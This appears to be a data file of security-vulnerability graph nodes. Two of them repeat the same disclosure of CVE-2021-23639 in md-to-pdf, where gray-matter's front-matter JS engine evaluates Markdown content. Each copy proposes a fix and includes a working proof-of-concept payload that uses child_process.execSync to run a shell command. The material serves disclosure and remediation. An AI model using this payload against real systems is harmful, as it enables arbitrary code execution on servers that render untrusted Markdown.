    <node id="CVE-2021-23639">
      <data key="d0">CVE</data>
      <data key="d1">javascript</data>
      <data key="d2">Security: gray-matter exposes front matter JS-engine that leads to arbitrary code execution</data>
      <data key="d3">The library [gray-matter](https://www.npmjs.com/package/gray-matter) (used by **md-to-pdf** to parse front matter) exposes a JS-engine by default, which essentially runs **eval** on the given Markdown.

https://github.com/simonhaenisch/md-to-pdf/blob/master/src/lib/md-to-pdf.ts#L26

Given that **md-to-pdf** is _only_ a Markdown to PDF-library and looking at how other projects use it - I think it is an undesirable _feature_ to be able to execute any arbitrary Javascript by anyone in control of the Markdown content.

A possible fix would be to override gray-matter's JS-engine:
```javascript
const { content: md, data: frontMatterConfig } = grayMatter(mdFileContent, { engines : { js : () =&gt; {} } } );
``` 

PoC:
```
$ cat /tmp/RCE.txt
cat: /tmp/RCE.txt: No such file or directory
$ node poc.js 
$ cat /tmp/RCE.txt
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```

poc.js:
```javascript
const { mdToPdf } = require('md-to-pdf');

var payload = '---js\n((require("child_process")).execSync("id &gt; /tmp/RCE.txt"))\n---RCE';

(async () =&gt; {
	await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();
```</data>
    </node>
    <node id="simonhaenisch/md-to-pdf#99">
      <data key="d0">Issue</data>
      <data key="d2">Security: gray-matter exposes front matter JS-engine that leads to arbitrary code execution</data>
      <data key="d3">The library [gray-matter](https://www.npmjs.com/package/gray-matter) (used by **md-to-pdf** to parse front matter) exposes a JS-engine by default, which essentially runs **eval** on the given Markdown.

https://github.com/simonhaenisch/md-to-pdf/blob/master/src/lib/md-to-pdf.ts#L26

Given that **md-to-pdf** is _only_ a Markdown to PDF-library and looking at how other projects use it - I think it is an undesirable _feature_ to be able to execute any arbitrary Javascript by anyone in control of the Markdown content.

A possible fix would be to override gray-matter's JS-engine:
```javascript
const { content: md, data: frontMatterConfig } = grayMatter(mdFileContent, { engines : { js : () =&gt; {} } } );
``` 

PoC:
```
$ cat /tmp/RCE.txt
cat: /tmp/RCE.txt: No such file or directory
$ node poc.js 
$ cat /tmp/RCE.txt
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```

poc.js:
```javascript
const { mdToPdf } = require('md-to-pdf');

var payload = '---js\n((require("child_process")).execSync("id &gt; /tmp/RCE.txt"))\n---RCE';

(async () =&gt; {
	await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();
```</data>
